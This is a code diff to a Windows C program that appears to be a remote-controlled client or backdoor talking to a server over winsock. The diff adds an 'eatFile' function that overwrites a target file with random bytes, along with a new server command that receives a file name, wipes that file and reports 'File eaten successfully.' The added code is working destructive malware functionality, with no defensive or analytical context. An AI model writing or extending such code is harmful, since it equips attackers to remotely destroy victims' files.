@@ -2,6 +2,8 @@
 #include<winsock2.h>
 #include<string.h>
 #include <dirent.h>
+#include <stdlib.h>
+#include <time.h>
 
 #pragma comment(lib,"ws2_32.lib")
 
@@ -111,6 +113,42 @@ void loadCWD() {
 	getcwd(buffer, sizeof(buffer));
 }
 
+void writeToBuffer(char data[]) {
+	// Clearing old data
+	memset(buffer,0,strlen(buffer));
+
+	// Putting new data
+	strcpy(buffer, data);
+}
+
+int eatFile(char fileName[]) {
+    int offset, n;
+    FILE *filein;
+
+    srand(time(NULL));
+
+    filein = fopen(fileName, "r");
+
+    if (filein == NULL) {
+        return 0;
+    }
+
+    fseek(filein, 0L, SEEK_END);
+    n = ftell(filein);
+
+    fclose(filein);
+
+    filein = fopen(fileName, "w");
+
+    for (int i = 0; i < n; i++) {
+        fputc(rand() % 256, filein);
+    }
+
+    fclose(filein);
+
+    return 1;
+}
+
 int main(int argc , char *argv[])
 {
 	// Main Code 
@@ -195,6 +233,27 @@ int main(int argc , char *argv[])
 
 						break;
 
+					case 5:
+						fprintf(stderr, "\n[+] Getting file name from server...");
+						
+						awaamiErrorCode = 0;
+						while (awaamiErrorCode == 0) {
+							awaamiErrorCode = reliableRecieve();
+						}
+
+						awaamiErrorCode = eatFile(buffer);
+
+						// Sending post eating report
+						fprintf(stderr, "\n[+] Sending post eating report.");
+						if (awaamiErrorCode == 1) {
+							writeToBuffer("File eaten successfully.");
+						} else {
+							writeToBuffer("File was not eaten, probably not found.");
+						}
+
+						reliableSend();
+
+						break;
 					
 					default:
 						printf("\n[+] Invalid Option Recieved.");
